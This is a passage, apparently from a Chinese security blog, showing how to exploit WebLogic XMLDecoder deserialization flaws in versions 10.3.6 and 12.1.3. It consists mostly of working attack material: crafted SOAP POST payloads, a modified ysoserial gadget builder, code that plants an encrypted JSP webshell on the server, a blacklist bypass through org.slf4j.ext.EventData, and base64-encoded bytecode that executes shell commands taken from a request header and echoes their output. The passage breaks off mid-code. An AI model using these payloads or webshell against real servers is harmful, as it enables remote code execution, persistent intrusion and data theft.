<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.beans.XMLEncoder;</span><br><span class="line">import java.io.*;</span><br><span class="line">public class Test&#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">File file = new File(&quot;C:\\Users\\lxhsec\\Downloads\\JRE8u20_RCE_Gadget-master\\exploit.ser&quot;);</span><br><span class="line">//读取ysoserial文件生成的payload</span><br><span class="line">FileInputStream fileInputStream = new FileInputStream(file);</span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((int) file.length());</span><br><span class="line">int buf_size=1024;</span><br><span class="line">byte[] buffer=new byte[buf_size];</span><br><span class="line">int len=0;</span><br><span class="line">while(-1 != (len=fileInputStream.read(buffer,0,buf_size)))&#123;</span><br><span class="line">byteArrayOutputStream.write(buffer,0,len);</span><br><span class="line">&#125;</span><br><span class="line">BufferedOutputStream oop = new BufferedOutputStream(new FileOutputStream(new File(&quot;C:\\Users\\lxhsec\\Downloads\\ysoserial-master\\target\\result.txt&quot;)));</span><br><span class="line">//使用jdk的xmlencoder把byte数组写入到 result.txt</span><br><span class="line">XMLEncoder xmlEncoder = new XMLEncoder(oop);</span><br><span class="line">xmlEncoder.flush();</span><br><span class="line">xmlEncoder.writeObject(byteArrayOutputStream.toByteArray());</span><br><span class="line">xmlEncoder.close();</span><br><span class="line">byteArrayOutputStream.close();</span><br><span class="line">fileInputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拼接Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 178338</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;</span><br><span class="line">//此处填写上面生成的XML。</span><br><span class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>效果:</p>
<p>使用ysoserial生成的只能适用于Windows平台，如果在Linux平台使用，则又要进行一次编译，兼容性有点不太好，因此我们可以<br>将ysoserial稍稍的进行更改。</p>
<p>这里我们将ysoserial的Gadgets.java文件进行更改。路径为：ysoserial-master\src\main\java\ysoserial\payloads\util\Gadgets.java.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span><br><span class="line">throws Exception &#123;</span><br><span class="line">final T templates = tplClass.newInstance();</span><br><span class="line">// use template gadget class</span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">pool.insertClassPath(new ClassClassPath(abstTranslet));</span><br><span class="line">final CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">// ---Start</span><br><span class="line">String cmd = &quot;&quot;;</span><br><span class="line">if(command.startsWith(&quot;filename:&quot;)) &#123;</span><br><span class="line">String filename = command.substring(9);</span><br><span class="line">try &#123;</span><br><span class="line">File file = new File(filename);</span><br><span class="line">if (file.exists()) &#123;</span><br><span class="line">FileReader reader = new FileReader(file);</span><br><span class="line">BufferedReader br = new BufferedReader(reader);</span><br><span class="line">StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">String line = &quot;&quot;;</span><br><span class="line">while ((line = br.readLine()) != null) &#123;</span><br><span class="line">sb.append(line);</span><br><span class="line">sb.append(&quot;\r\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cmd = sb.toString();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">System.err.println(String.format(&quot;filename %s not exists!&quot;, filename));</span><br><span class="line">System.exit(0);</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">// run command in static initializer</span><br><span class="line">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><br><span class="line">cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><br><span class="line">command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><br><span class="line">&quot;\&quot;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">System.err.println(cmd);</span><br><span class="line">// ---end</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><br><span class="line">clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><br><span class="line">CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line">final byte[] classBytes = clazz.toBytecode();</span><br><span class="line">// inject class bytes into instance</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;</span><br><span class="line">classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">&#125;);</span><br><span class="line">// required to make TemplatesImpl happy</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><br><span class="line">return templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存后重新编译mvn clean package -DskipTests.</p>
<p>编译使用的是JDK1.8</p>
<p>修改后的ysoserial，将命令执行，转换成了代码执行。</p>
<p>整个兼容两边平台的代码TestCode.txt。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//TestCode.txt</span><br><span class="line">String WEB_PATH = &quot;servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echolxhsec.jsp&quot;;</span><br><span class="line">String ShellContent = &quot;&lt;%@page import=\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(\&quot;pass\&quot;)!=null)&#123;String k=(\&quot;\&quot;+UUID.randomUUID()).replace(\&quot;-\&quot;,\&quot;\&quot;).substring(16);session.putValue(\&quot;u\&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(\&quot;AES\&quot;);c.init(2,new SecretKeySpec((session.getValue(\&quot;u\&quot;)+\&quot;\&quot;).getBytes(),\&quot;AES\&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;&quot;;</span><br><span class="line">try &#123;</span><br><span class="line">java.io.PrintWriter printWriter = new java.io.PrintWriter(WEB_PATH);</span><br><span class="line">printWriter.println(ShellContent);</span><br><span class="line">printWriter.close();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行：<br>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 “filename:C:\Users\lxhsec\Desktop\TestCode.txt” &gt; result.txt</p>
<p>reuslt.txt转换成Byte[]后执行，如下：</p>
<p>访问:<a href="http://127.0.0.1:7001/_async/echolxhsec.jsp">http://127.0.0.1:7001/_async/echolxhsec.jsp</a></p>
<h6 id="Weblogic-12-1-3-利用利用-org-slf4j-ext-EventData-构造函数执行构造函数执行-readObject"><a href="#Weblogic-12-1-3-利用利用-org-slf4j-ext-EventData-构造函数执行构造函数执行-readObject" class="headerlink" title="Weblogic 12.1.3 利用利用 org.slf4j.ext.EventData 构造函数执行构造函数执行 readObject()."></a>Weblogic 12.1.3 利用利用 org.slf4j.ext.EventData 构造函数执行构造函数执行 readObject().</h6><p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet在Weblogic 12.1.3中不存在，因此需要重新找利用链。</p>
<p>Weblogic的黑名单只会过滤传入的第一层XML，使用org.slf4j.ext.EventData传入的第一层XML是String，因此绕过黑名单检测。</p>
<p>构造函数参考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public EventData(String xml) &#123;</span><br><span class="line">ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());</span><br><span class="line">try &#123;</span><br><span class="line">XMLDecoder decoder = new XMLDecoder(bais);</span><br><span class="line">this.eventData = (Map&lt;String, Object&gt;) decoder.readObject();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">throw new EventException(&quot;Error decoding &quot; + xml, e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造写入文件Payload，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.124.129:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 962</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;</span><br><span class="line">&lt;![CDATA[&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;lxhsecTest&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;</span><br><span class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>结果:</p>
<h5 id="wls-wsat-war"><a href="#wls-wsat-war" class="headerlink" title="wls-wsat.war"></a>wls-wsat.war</h5><h6 id="Weblogic-10-3-6-回显构造回显构造"><a href="#Weblogic-10-3-6-回显构造回显构造" class="headerlink" title="Weblogic 10.3.6 回显构造回显构造."></a>Weblogic 10.3.6 回显构造回显构造.</h6><p>bea_wls9_async_response.war的反序列化链无法造成回显，但是wls-wsat.war的却可以。</p>
<p>访问：&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>以下测试均在 JDK 1.6.0_45 64bit 下进行。</p>
<p>拿lufei大佬的工具改改。</p>
<p>这里我直接使用lufei的工具，发现 &gt; 等特殊字符，会被当成字符串。</p>
<p>这里将工具的exec函数更改，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">public class ResultBaseExec &#123;</span><br><span class="line">public static String exec(String cmd) throws Exception &#123;</span><br><span class="line">String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">Process p;</span><br><span class="line">if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">//执行命令</span><br><span class="line">// p = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd);</span><br><span class="line">p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">//执行命令</span><br><span class="line">// p = Runtime.getRuntime().exec(&quot;/bin/sh -c &quot; + cmd);</span><br><span class="line">p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;);</span><br><span class="line">&#125;</span><br><span class="line">InputStream fis=p.getInputStream();</span><br><span class="line">InputStreamReader isr=new InputStreamReader(fis);</span><br><span class="line">BufferedReader br=new BufferedReader(isr);</span><br><span class="line">String line=null;</span><br><span class="line">String result = &quot;&quot;;</span><br><span class="line">while((line=br.readLine())!=null)</span><br><span class="line">&#123;</span><br><span class="line">result = result + line;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成.class文件<br>“C:\Program Files\Java\jdk1.6.0_45\bin\javac.exe” C:\Users\lxhsec\Downloads\WeblogicCode\src\main\java\ResultBaseExec.java</p>
<p>接着将.class转换成Base64，当然你转成hex这些也可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sun.misc.BASE64Encoder;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">public class toBase64 &#123;</span><br><span class="line">public static byte[] toByteArray(InputStream in) throws IOException, IOException &#123;</span><br><span class="line">ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">byte[] buffer = new byte[1024 * 4];</span><br><span class="line">int n = 0;</span><br><span class="line">while ((n = in.read(buffer)) != -1) &#123;</span><br><span class="line">out.write(buffer, 0, n);</span><br><span class="line">&#125;</span><br><span class="line">return out.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line">public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">BASE64Encoder base64Encoder = new BASE64Encoder();</span><br><span class="line">//class文件路径</span><br><span class="line">InputStream in = new FileInputStream(&quot;C:\\Users\\lxhsec\\Downloads\\WeblogicCode\\src\\main\\java\\ResultBaseExec.class&quot;);</span><br><span class="line">byte[] data = toByteArray(in);</span><br><span class="line">in.close();</span><br><span class="line">String encode = base64Encoder.encodeBuffer(data);</span><br><span class="line">System.out.println(encode);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq</span><br></pre></td></tr></table></figure>

<p>生成之后使用test_code测试，发现&gt;被解析成了我们想要的。</p>
<p>替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clazz.makeClassInitializer()</span><br><span class="line">.insertAfter(&quot;&quot;</span><br><span class="line">+ &quot;String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\&quot;lfcmd\&quot;);\n&quot;</span><br><span class="line">+ &quot;String R = \&quot;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\&quot;;&quot;</span><br><span class="line">+ &quot;sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();&quot;</span><br><span class="line">+ &quot;byte[] bt = decoder.decodeBuffer(R);&quot;</span><br><span class="line">+ &quot;org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();&quot;</span><br><span class="line">+ &quot;Class cl = cls.defineClass(\&quot;ResultBaseExec\&quot;,bt);&quot;</span><br><span class="line">+ &quot;java.lang.reflect.Method m = cl.getMethod(\&quot;exec\&quot;,new Class[]&#123;String.class&#125;);&quot;</span><br><span class="line">+ &quot;Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n&quot;</span><br><span class="line">+ &quot;outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n&quot;</span><br><span class="line">+ &quot;outputStream.flush();\n&quot;</span><br><span class="line">+ &quot;response.getWriter().write(\&quot;\&quot;);&quot;</span><br><span class="line">+ &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>然后运行JDK7u21,编译生成Byte[], 执行。</p>
<h6 id="Weblogic-12-1-3-回显构造回显构造"><a href="#Weblogic-12-1-3-回显构造回显构造" class="headerlink" title="Weblogic 12.1.3 回显构造回显构造."></a>Weblogic 12.1.3 回显构造回显构造.</h6><p>将</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clazz.makeClassInitializer()</span><br><span class="line">.insertAfter(&quot;&quot;</span><br><span class="line">+ &quot;String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\&quot;lfcmd\&quot;);\n&quot;</span><br><span class="line">+ &quot;String R = \&quot;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\&quot;;&quot;</span><br><span class="line">+ &quot;sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();&quot;</span><br><span class="line">+ &quot;byte[] bt = decoder.decodeBuffer(R);&quot;</span><br><span class="line">+ &quot;org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();&quot;</span><br><span class="line">+ &quot;Class cl = cls.defineClass(\&quot;ResultBaseExec\&quot;,bt);&quot;</span><br><span class="line">+ &quot;java.lang.reflect.Method m = cl.getMethod(\&quot;exec\&quot;,new Class[]&#123;String.class&#125;);&quot;</span><br><span class="line">+ &quot;Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n&quot;</span><br><span class="line">+ 